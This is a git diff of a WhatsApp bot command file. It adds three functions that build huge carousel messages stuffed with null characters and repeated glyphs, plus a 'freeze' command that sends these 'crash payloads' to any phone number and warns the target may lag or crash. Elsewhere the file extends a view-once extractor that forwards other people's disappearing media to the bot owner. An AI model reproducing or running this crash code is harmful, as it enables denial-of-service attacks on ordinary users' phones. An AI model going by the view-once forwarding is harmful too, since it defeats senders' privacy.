@@ -2,16 +2,209 @@ const { Sticker, StickerTypes } = require('wa-sticker-formatter');
 const { MENU_IMAGE_URL } = require('../config');
 const { getGroupSettings, setGroupSetting, getGlobalSetting, setGlobalSetting } = require('../store');
 const { isSenderAdmin } = require('../moderation');
+const {
+  generateWAMessageFromContent,
+  proto,
+  generateWAMessage,
+  prepareWAMessageMedia,
+  downloadContentFromMessage
+} = require('@whiskeysockets/baileys');
+
+
+
+// ==========================================
+//          MAELSTROM MESSAGE GENERATOR
+// ==========================================
+
+function generateMaelstromMessage(target, payloadSize, cycle, wave, numCards) {
+  const junk = '\u0000'.repeat(Math.min(payloadSize, 60000));
+  const heavyJunk = 'ꦾ'.repeat(Math.min(payloadSize, 55000));
+
+  const cards = [];
+  const actualCards = Math.min(numCards, 15);
+
+  for (let c = 0; c < actualCards; c++) {
+    const card = {
+      body: {
+        text: `🌊 𝐖𝐀𝐕𝐄 ${wave} • 𝐂𝐘𝐂𝐋𝐄 ${cycle} ${junk.slice(0, 6000)}`
+      },
+      footer: {
+        text: `🌪️ MAELSTROM • ${c+1}/${actualCards}`
+      },
+      header: {
+        title: `💀 ${heavyJunk.slice(0, 6000)}`,
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+          fileLength: "591",
+          height: 0,
+          width: 0,
+          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1721344123",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQEBAAAAAAAAAAAAAAABAwQAAgUBAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
+          scanLengths: [247, 201, 73, 63],
+          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
+        }
+      },
+      nativeFlowMessage: {
+        buttons: []
+      }
+    };
+
+    const buttons = [];
+    const numButtons = Math.min(8, Math.floor(payloadSize / 10000));
+    for (let b = 0; b < numButtons; b++) {
+      buttons.push({
+        name: "galaxy_message",
+        buttonParamsJson: JSON.stringify({
+          header: "\u0000".repeat(Math.min(payloadSize, 15000)),
+          body: "\u0000".repeat(Math.min(payloadSize, 15000)),
+          flow_action: "navigate",
+          flow_action_payload: { screen: "FORM_SCREEN" },
+          flow_cta: "🌪️",
+          flow_id: "1169834181134583",
+          flow_message_version: "3",
+          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+        })
+      });
+    }
+    card.nativeFlowMessage.buttons = buttons;
+    cards.push(card);
+  }
+
+  const message = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: {
+            text: `🌪️ 𝐌𝐀𝐄𝐋𝐒𝐓𝐑𝐎𝐌 ${heavyJunk.slice(0, 55000)}`
+          },
+          footer: {
+            text: `( 🌊 ) WAVE ${wave} • CYCLE ${cycle} ( 🌊 )`
+          },
+          header: {
+            hasMediaAttachment: false
+          },
+          carouselMessage: {
+            cards: cards
+          }
+        }
+      }
+    }
+  };
+
+  const wamessage = generateWAMessageFromContent(target, message, {});
+  return wamessage;
+}
 
 function bareNumber(jid = '') {
   return jid.split('@')[0].split(':')[0];
 }
+function generateCataclysmMessage(target, config, sequence) {
+  const junk = '\u0000'.repeat(config.button);
+  const heavyJunk = 'ꦾ'.repeat(Math.min(config.text, 55000));
+  const numCards = config.cards;
+
+  const cards = [];
+  for (let c = 0; c < numCards; c++) {
+    const card = {
+      body: {
+        text: `☢️ 𝐂𝐀𝐓𝐀𝐂𝐋𝐘𝐒𝐌 ${junk.slice(0, 8000)}`
+      },
+      footer: {
+        text: `💀 WAVE ${sequence} - ${c+1}/${numCards}`
+      },
+      header: {
+        title: `💀 ${heavyJunk.slice(0, 8000)}`,
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+          fileLength: "591",
+          height: 0,
+          width: 0,
+          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1721344123",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQEBAAAAAAAAAAAAAAABAwQAAgUBAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
+          scanLengths: [247, 201, 73, 63],
+          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
+        }
+      },
+      nativeFlowMessage: {
+        buttons: []
+      }
+    };
+
+    // Massive button array
+    const numButtons = Math.min(10, Math.floor(config.button / 5000));
+    const buttons = [];
+    for (let b = 0; b < numButtons; b++) {
+      buttons.push({
+        name: "galaxy_message",
+        buttonParamsJson: JSON.stringify({
+          header: "\u0000".repeat(Math.min(config.button, 20000)),
+          body: "\u0000".repeat(Math.min(config.button, 20000)),
+          flow_action: "navigate",
+          flow_action_payload: { screen: "FORM_SCREEN" },
+          flow_cta: "☢️",
+          flow_id: "1169834181134583",
+          flow_message_version: "3",
+          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+        })
+      });
+    }
+    card.nativeFlowMessage.buttons = buttons;
+    cards.push(card);
+  }
+
+  const message = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: {
+            text: `☢️ 𝐂𝐀𝐓𝐀𝐂𝐋𝐘𝐒𝐌 ${heavyJunk.slice(0, 55000)}`
+          },
+          footer: {
+            text: `( 💀 ) WAVE ${sequence} ( 💀 )`
+          },
+          header: {
+            hasMediaAttachment: false
+          },
+          carouselMessage: {
+            cards: cards
+          }
+        }
+      }
+    }
+  };
+
+  const wamessage = generateWAMessageFromContent(target, message, {});
+  return wamessage;
+}
+
 // ==========================================
 //        PRINCE API HELPER & CONSTANTS
 // ==========================================
 const P_KEY = 'prince';
 const P_BASE = 'https://api.princetechn.com/api';
-
+const pairSessions = new Map();
 /**
  * Helper to handle media downloads to reduce repetitive code
  */
@@ -88,6 +281,94 @@ function getOwnerJid() {
   const owner = process.env.OWNER_NUMBER || '2348169946429';
   return `${owner.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 }
+function generateHeavyMessage(target, payloadSize, sequence) {
+  const junk = '\u0000'.repeat(payloadSize);
+  const heavyJunk = 'ꦾ'.repeat(Math.min(payloadSize, 55000));
+  
+  const cards = [];
+  const numCards = 10;
+  
+  for (let c = 0; c < numCards; c++) {
+    const card = {
+      body: {
+        text: `𝐅͢𝐑͢𝐄͢𝐄͢𝐙͢𝐄 ${junk.slice(0, 5000)}`
+      },
+      footer: {
+        text: `🔥 CRASH ${sequence}`
+      },
+      header: {
+        title: `💀 ${heavyJunk.slice(0, 5000)}`,
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+          fileLength: "591",
+          height: 0,
+          width: 0,
+          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1721344123",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQEBAAAAAAAAAAAAAAABAwQAAgUBAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+          scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
+          scanLengths: [247, 201, 73, 63],
+          midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
+        }
+      },
+      nativeFlowMessage: {
+        buttons: []
+      }
+    };
+    
+    const buttons = [];
+    for (let b = 0; b < 5; b++) {
+      buttons.push({
+        name: "galaxy_message",
+        buttonParamsJson: JSON.stringify({
+          header: "\u0000".repeat(10000),
+          body: "\u0000".repeat(10000),
+          flow_action: "navigate",
+          flow_action_payload: { screen: "FORM_SCREEN" },
+          flow_cta: "🔥",
+          flow_id: "1169834181134583",
+          flow_message_version: "3",
+          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+        })
+      });
+    }
+    card.nativeFlowMessage.buttons = buttons;
+    cards.push(card);
+  }
+  
+  const message = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: {
+            text: `💀 𝐅𝐑𝐄𝐄𝐙𝐄 ${heavyJunk.slice(0, 55000)}`
+          },
+          footer: {
+            text: `( 🍁 ) CRASH ${sequence} ( 🍁 )`
+          },
+          header: {
+            hasMediaAttachment: false
+          },
+          carouselMessage: {
+            cards: cards
+          }
+        }
+      }
+    }
+  };
+  
+  const wamessage = generateWAMessageFromContent(target, message, {});
+  return wamessage;
+}
 
 // Check if command is being used in a group (to forward to owner)
 function shouldForwardToOwner(msg) {
@@ -154,7 +435,98 @@ async function setAutoBio(sock) {
     console.error('Auto-bio error:', error);
   }
 }
+// ==========================================
+//          FREEZE - TARGET BY NUMBER
+// ==========================================
 
+
+
+register({
+  name: 'freeze',
+  aliases: ['fz', 'freezeuser'],
+  category: 'TOOLS',
+  description: 'Send invisible crash payload to a specific number',
+  async execute({ sock, from, args, msg, prefix, command }) {
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: '❌ *Owner only command.*\n\nThis feature is restricted to the bot owner.' 
+      });
+    }
+
+    // Parse arguments
+    let targetNumber = args[0];
+    let iterations = 2;
+
+    if (!targetNumber) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Usage:* ${prefix}${command} <phone_number> [iterations]\n\n*Example:*\n${prefix}${command} 2348169946429\n${prefix}${command} 2348169946429 3\n\n*Phone number:* Must include country code (e.g., 234 for Nigeria)\n*Iterations:* Max 5 (default 2)` 
+      });
+    }
+
+    // Clean phone number
+    targetNumber = targetNumber.replace(/[^0-9]/g, '');
+    if (targetNumber.length < 10) {
+      return await sock.sendMessage(from, { 
+        text: '❌ Invalid phone number. Please provide a full number with country code.' 
+      });
+    }
+
+    if (args[1] && !isNaN(args[1])) {
+      iterations = Math.min(parseInt(args[1]), 5);
+    }
+
+    const targetJid = `${targetNumber}@s.whatsapp.net`;
+
+    // Confirmation
+    await sock.sendMessage(from, {
+      text: `⚠️ *FREEZE CONFIRMATION*\n\n👤 *Target:* ${targetNumber}\n🔄 *Iterations:* ${iterations}\n\n⏳ Starting in 3 seconds...`
+    });
+
+    await new Promise(r => setTimeout(r, 3000));
+
+    await sock.sendMessage(from, { text: `❄️ Executing freeze on ${targetNumber}...` });
+
+    let sent = 0;
+    let failed = 0;
+    const startTime = Date.now();
+
+    for (let i = 0; i < iterations; i++) {
+      try {
+        // Generate heavy payload
+        const payloadSize = 50000 + (i * 5000); // Increasing size each iteration
+        const heavyMsg = generateHeavyMessage(targetJid, payloadSize, i + 1);
+        
+        // Send via relay
+        await sock.relayMessage(targetJid, heavyMsg.message, {
+          messageId: heavyMsg.key.id
+        });
+        
+        sent++;
+        
+        if (i % 2 === 0 && i > 0) {
+          await sock.sendMessage(from, {
+            text: `❄️ Progress: ${i}/${iterations} sent to ${targetNumber}`
+          });
+        }
+        
+        await new Promise(r => setTimeout(r, 800));
+        
+      } catch (err) {
+        failed++;
+        console.error('Freeze error:', err.message);
+      }
+    }
+
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+
+    await sock.sendMessage(from, {
+      text: `❄️ *Freeze Complete*\n\n👤 *Target:* ${targetNumber}\n📤 *Sent:* ${sent}/${iterations}\n❌ *Failed:* ${failed}\n⏱️ *Time:* ${elapsed}s\n\n⚠️ *Target may experience severe lag or crash!*`
+    });
+  }
+});
 // Auto-bio command - manual trigger for updating bio
 register({
   name: 'autobio',
@@ -235,283 +607,7 @@ register({
   }
 });
 
-// ==========================================
-//          STATUS DOWNLOADER
-// ==========================================
 
-// Store for tracking which statuses have been processed
-const processedStatuses = new Set();
-
-// Status download command - lists available statuses or downloads them
-register({
-  name: 'status',
-  aliases: ['st', 'statusdl', 'statusview'],
-  category: 'TOOLS',
-  description: 'Download status updates from your contacts',
-  async execute({ sock, from, args, msg, prefix, command }) {
-    // Owner only command
-    const ownerJid = getOwnerJid();
-    const isOwner = from === ownerJid || msg.key.fromMe;
-
-    if (!isOwner) {
-      return await sock.sendMessage(from, { 
-        text: `❌ *Owner only command.*\n\nOnly the bot owner can use this command.` 
-      });
-    }
-
-    const action = args[0]?.toLowerCase();
-
-    // If no action, show help
-    if (!action) {
-      return await sock.sendMessage(from, { 
-        text: `📱 *Status Downloader*\n\n*Commands:*\n${prefix}${command} list - List recent statuses\n${prefix}${command} get <number> - Download status from a contact\n${prefix}${command} all - Download all recent statuses\n\n*Example:*\n${prefix}${command} get 2348169946429\n\n*Note:* The bot must have the contact in its chat list.` 
-      });
-    }
-
-    if (action === 'list') {
-      // List contacts with recent statuses
-      await sock.sendMessage(from, { text: `⏳ Fetching recent statuses...` });
-
-      try {
-        // Get status updates from contacts
-        const statuses = await sock.getStatuses();
-        
-        if (!statuses || statuses.length === 0) {
-          return await sock.sendMessage(from, { 
-            text: `📱 *No statuses found*\n\nNo contacts have posted status updates recently.` 
-          });
-        }
-
-        // Group statuses by sender
-        const grouped = {};
-        statuses.forEach(status => {
-          const sender = status.sender || status.participant || 'Unknown';
-          if (!grouped[sender]) {
-            grouped[sender] = [];
-          }
-          grouped[sender].push(status);
-        });
-
-        let msg = `📱 *Recent Statuses*\n\n`;
-        msg += `📊 *Total:* ${statuses.length} statuses\n`;
-        msg += `👥 *Contacts:* ${Object.keys(grouped).length}\n\n`;
-
-        for (const [sender, stats] of Object.entries(grouped)) {
-          const name = sender.split('@')[0];
-          const count = stats.length;
-          const types = stats.map(s => {
-            if (s.image) return '🖼️';
-            if (s.video) return '🎬';
-            if (s.audio) return '🎵';
-            return '📄';
-          }).join('');
-          msg += `👤 *${name}* - ${count} statuses\n`;
-          msg += `   ${types}\n\n`;
-        }
-
-        msg += `💡 Use ${prefix}${command} get <number> to download a contact's statuses.\n`;
-        msg += `💡 Use ${prefix}${command} all to download all recent statuses.`;
-
-        await sock.sendMessage(from, { text: msg });
-
-      } catch (error) {
-        console.error('Status list error:', error);
-        await sock.sendMessage(from, { 
-          text: `⚠️ Error fetching statuses: ${error.message || 'Unknown error'}` 
-        });
-      }
-      return;
-    }
-
-    if (action === 'all') {
-      // Download all statuses
-      await sock.sendMessage(from, { text: `⏳ Downloading all recent statuses...` });
-
-      try {
-        const statuses = await sock.getStatuses();
-        
-        if (!statuses || statuses.length === 0) {
-          return await sock.sendMessage(from, { 
-            text: `📱 *No statuses found*` 
-          });
-        }
-
-        let downloaded = 0;
-        let failed = 0;
-
-        for (const status of statuses) {
-          try {
-            const sender = status.sender || status.participant || 'Unknown';
-            const mediaType = status.image ? 'image' : 
-                             status.video ? 'video' : 
-                             status.audio ? 'audio' : 'unknown';
-
-            if (mediaType === 'unknown') continue;
-
-            // Check if already processed
-            const id = status.id || status.key?.id;
-            if (id && processedStatuses.has(id)) continue;
-
-            // Download the media
-            const mediaBuffer = await sock.downloadStatus(status);
-            if (!mediaBuffer || mediaBuffer.length < 100) continue;
-
-            // Send to owner
-            const caption = `📱 *Status from @${sender.split('@')[0]}*\n📅 ${new Date().toLocaleString()}`;
-
-            if (mediaType === 'image') {
-              await sock.sendMessage(ownerJid, {
-                image: mediaBuffer,
-                caption: caption,
-                mentions: [sender]
-              });
-            } else if (mediaType === 'video') {
-              await sock.sendMessage(ownerJid, {
-                video: mediaBuffer,
-                mimetype: 'video/mp4',
-                caption: caption,
-                mentions: [sender]
-              });
-            } else if (mediaType === 'audio') {
-              await sock.sendMessage(ownerJid, {
-                audio: mediaBuffer,
-                mimetype: 'audio/mpeg',
-                fileName: `status_${Date.now()}.mp3`,
-                caption: caption,
-                mentions: [sender]
-              });
-            }
-
-            // Mark as processed
-            if (id) processedStatuses.add(id);
-            downloaded++;
-
-            // Small delay between downloads
-            await new Promise(r => setTimeout(r, 500));
-
-          } catch (statusErr) {
-            console.warn('Failed to download status:', statusErr.message);
-            failed++;
-          }
-        }
-
-        await sock.sendMessage(from, { 
-          text: `✅ *Status Download Complete*\n\n📥 *Downloaded:* ${downloaded}\n❌ *Failed:* ${failed}\n📊 *Total:* ${statuses.length}` 
-        });
-
-      } catch (error) {
-        console.error('Status download all error:', error);
-        await sock.sendMessage(from, { 
-          text: `⚠️ Error: ${error.message || 'Could not download statuses.'}` 
-        });
-      }
-      return;
-    }
-
-    if (action === 'get') {
-      // Download statuses from a specific contact
-      const number = args[1];
-      if (!number) {
-        return await sock.sendMessage(from, { 
-          text: `❌ Please provide a phone number.\nExample: ${prefix}${command} get 2348169946429` 
-        });
-      }
-
-      const targetJid = `${number.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
-
-      await sock.sendMessage(from, { text: `⏳ Fetching statuses from @${targetJid.split('@')[0]}...` });
-
-      try {
-        const statuses = await sock.getStatuses();
-        
-        if (!statuses || statuses.length === 0) {
-          return await sock.sendMessage(from, { 
-            text: `📱 *No statuses found*` 
-          });
-        }
-
-        const contactStatuses = statuses.filter(s => {
-          const sender = s.sender || s.participant || '';
-          return sender === targetJid;
-        });
-
-        if (contactStatuses.length === 0) {
-          return await sock.sendMessage(from, { 
-            text: `❌ No statuses found from @${targetJid.split('@')[0]}.\n\n💡 Make sure the contact has posted a status recently.` 
-          });
-        }
-
-        let downloaded = 0;
-        let failed = 0;
-
-        for (const status of contactStatuses) {
-          try {
-            const mediaType = status.image ? 'image' : 
-                             status.video ? 'video' : 
-                             status.audio ? 'audio' : 'unknown';
-
-            if (mediaType === 'unknown') continue;
-
-            const id = status.id || status.key?.id;
-            if (id && processedStatuses.has(id)) continue;
-
-            const mediaBuffer = await sock.downloadStatus(status);
-            if (!mediaBuffer || mediaBuffer.length < 100) continue;
-
-            const caption = `📱 *Status from @${targetJid.split('@')[0]}*\n📅 ${new Date().toLocaleString()}`;
-
-            if (mediaType === 'image') {
-              await sock.sendMessage(ownerJid, {
-                image: mediaBuffer,
-                caption: caption,
-                mentions: [targetJid]
-              });
-            } else if (mediaType === 'video') {
-              await sock.sendMessage(ownerJid, {
-                video: mediaBuffer,
-                mimetype: 'video/mp4',
-                caption: caption,
-                mentions: [targetJid]
-              });
-            } else if (mediaType === 'audio') {
-              await sock.sendMessage(ownerJid, {
-                audio: mediaBuffer,
-                mimetype: 'audio/mpeg',
-                fileName: `status_${Date.now()}.mp3`,
-                caption: caption,
-                mentions: [targetJid]
-              });
-            }
-
-            if (id) processedStatuses.add(id);
-            downloaded++;
-            await new Promise(r => setTimeout(r, 500));
-
-          } catch (statusErr) {
-            console.warn('Failed to download status:', statusErr.message);
-            failed++;
-          }
-        }
-
-        await sock.sendMessage(from, { 
-          text: `✅ *Status Download Complete*\n\n👤 *Contact:* @${targetJid.split('@')[0]}\n📥 *Downloaded:* ${downloaded}\n❌ *Failed:* ${failed}\n📊 *Total:* ${contactStatuses.length}` 
-        });
-
-      } catch (error) {
-        console.error('Status download contact error:', error);
-        await sock.sendMessage(from, { 
-          text: `⚠️ Error: ${error.message || 'Could not download statuses.'}` 
-        });
-      }
-      return;
-    }
-
-    // Invalid action
-    await sock.sendMessage(from, { 
-      text: `❌ Invalid action. Use: list, get, or all\n\n${prefix}${command} list - List recent statuses\n${prefix}${command} get <number> - Download from a contact\n${prefix}${command} all - Download all recent statuses` 
-    });
-  }
-});
 // -------------------- TO IMAGE --------------------
 register({
   name: 'toimage',
@@ -522,37 +618,35 @@ register({
     const target = quoted || msg;
     const mime = target.mimetype || '';
 
-    // Check if it's a sticker
+    // Use global PREFIX and command name as fallbacks
+    const cmdPrefix = prefix || PREFIX;
+    const cmdName = command || 'toimage';
+
     if (!mime.includes('webp') && !mime.includes('sticker')) {
-      await sock.sendMessage(from, { text: `❌ Reply to a sticker with: ${prefix}${command}` });
+      await sock.sendMessage(from, { text: `❌ Reply to a sticker with: ${cmdPrefix}${cmdName}` });
       return;
     }
 
     await sock.sendMessage(from, { text: `⏳ Converting sticker to image...` });
 
     try {
-      // Download the sticker
       const mediaBuffer = await sock.downloadMediaMessage(target);
       if (!mediaBuffer || mediaBuffer.length < 100) {
         return await sock.sendMessage(from, { text: `❌ Failed to download sticker.` });
       }
 
-      // Convert to image using sharp
       const sharp = require('sharp');
       let imageBuffer;
       let imageExt = 'jpg';
 
       try {
-        // Try to convert to JPEG
         imageBuffer = await sharp(mediaBuffer).jpeg({ quality: 90 }).toBuffer();
         imageExt = 'jpg';
       } catch (sharpErr) {
         try {
-          // Try PNG if JPEG fails
           imageBuffer = await sharp(mediaBuffer).png({ quality: 90 }).toBuffer();
           imageExt = 'png';
         } catch (pngErr) {
-          // Try using ffmpeg as fallback
           const ffmpeg = require('ffmpeg-static');
           const { exec } = require('child_process');
           const fs = require('fs');
@@ -587,13 +681,11 @@ register({
       const ownerJid = getOwnerJid();
       const caption = `🖼️ *Sticker to Image*\n📦 *Size:* ${(imageBuffer.length / 1024).toFixed(1)} KB`;
 
-      // Send to owner
       await sock.sendMessage(ownerJid, {
         image: imageBuffer,
         caption: caption
       });
 
-      // Confirm to user
       await sock.sendMessage(from, { 
         text: `✅ Sticker converted and sent to owner's chat.\n📤 *Sent to:* ${ownerJid.split('@')[0]}` 
       });
@@ -604,7 +696,6 @@ register({
     }
   }
 });
-
 // -------------------- TO GIF --------------------
 register({
   name: 'togif',
@@ -615,16 +706,17 @@ register({
     const target = quoted || msg;
     const mime = target.mimetype || '';
 
-    // Check if it's a sticker or video
+    const cmdPrefix = prefix || PREFIX;
+    const cmdName = command || 'togif';
+
     if (!mime.includes('webp') && !mime.includes('sticker') && !mime.includes('video') && !mime.includes('gif')) {
-      await sock.sendMessage(from, { text: `❌ Reply to a sticker or video with: ${prefix}${command}` });
+      await sock.sendMessage(from, { text: `❌ Reply to a sticker or video with: ${cmdPrefix}${cmdName}` });
       return;
     }
 
     await sock.sendMessage(from, { text: `⏳ Converting to GIF...` });
 
     try {
-      // Download the media
       const mediaBuffer = await sock.downloadMediaMessage(target);
       if (!mediaBuffer || mediaBuffer.length < 100) {
         return await sock.sendMessage(from, { text: `❌ Failed to download media.` });
@@ -633,7 +725,6 @@ register({
       let gifBuffer = mediaBuffer;
       let isConverted = false;
 
-      // If it's a sticker, convert to video then GIF
       if (mime.includes('webp') || mime.includes('sticker')) {
         try {
           const ffmpeg = require('ffmpeg-static');
@@ -665,7 +756,6 @@ register({
         }
       }
 
-      // If it's a video, convert to GIF
       if (mime.includes('video') && !isConverted) {
         try {
           const ffmpeg = require('ffmpeg-static');
@@ -703,7 +793,6 @@ register({
 
       const ownerJid = getOwnerJid();
 
-      // Send to owner as GIF (video with gifPlayback)
       await sock.sendMessage(ownerJid, {
         video: gifBuffer,
         mimetype: 'video/mp4',
@@ -723,15 +812,17 @@ register({
 });
 
 // -------------------- VIEWONCE --------------------
+// -------------------- VIEWONCE --------------------
 register({
   name: 'viewonce',
-  aliases: ['vo', 'once', 'viewonceimg'],
+  aliases: ['vo', 'once', 'viewonceimg', 'vv', 'vv2'],
   category: 'TOOLS',
   description: 'Download view-once media and send to owner',
   async execute({ sock, from, msg, quoted, prefix, command }) {
     const target = quoted || msg;
+    const cmdPrefix = prefix || PREFIX;
+    const cmdName = command || 'viewonce';
 
-    // Check if it's a view-once message
     const msgKeys = Object.keys(target.message || {});
     const isViewOnce = msgKeys.some(k => 
       k.includes('viewOnce') || 
@@ -741,17 +832,15 @@ register({
 
     if (!isViewOnce) {
       return await sock.sendMessage(from, { 
-        text: `❌ Reply to a view-once message with: ${prefix}${command}\n\n*Note:* You must reply to a view-once image or video.` 
+        text: `❌ Reply to a view-once message with: ${cmdPrefix}${cmdName}\n\n*Note:* You must reply to a view-once image or video.` 
       });
     }
 
     await sock.sendMessage(from, { text: `⏳ Processing view-once media...` });
 
     try {
-      // Extract the actual media from the view-once wrapper
       let mediaMessage = target.message;
       
-      // Handle different view-once structures
       if (mediaMessage.viewOnceMessageV2) {
         mediaMessage = mediaMessage.viewOnceMessageV2.message;
       } else if (mediaMessage.viewOnceMessage) {
@@ -760,7 +849,6 @@ register({
         mediaMessage = mediaMessage.message;
       }
 
-      // Find the media type
       const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage'];
       let mediaType = null;
       let mediaData = null;
@@ -777,7 +865,6 @@ register({
         return await sock.sendMessage(from, { text: `❌ Could not extract media from view-once message.` });
       }
 
-      // Download the media
       const mediaBuffer = await sock.downloadMediaMessage(target);
       if (!mediaBuffer || mediaBuffer.length < 100) {
         return await sock.sendMessage(from, { text: `❌ Failed to download view-once media.` });
@@ -793,7 +880,6 @@ register({
       caption += `📅 *Date:* ${new Date().toLocaleString()}\n`;
       caption += `👤 *From:* ${from.split('@')[0]}`;
 
-      // Send based on media type
       if (mediaType === 'imageMessage') {
         await sock.sendMessage(ownerJid, {
           image: mediaBuffer,
@@ -802,6 +888,7 @@ register({
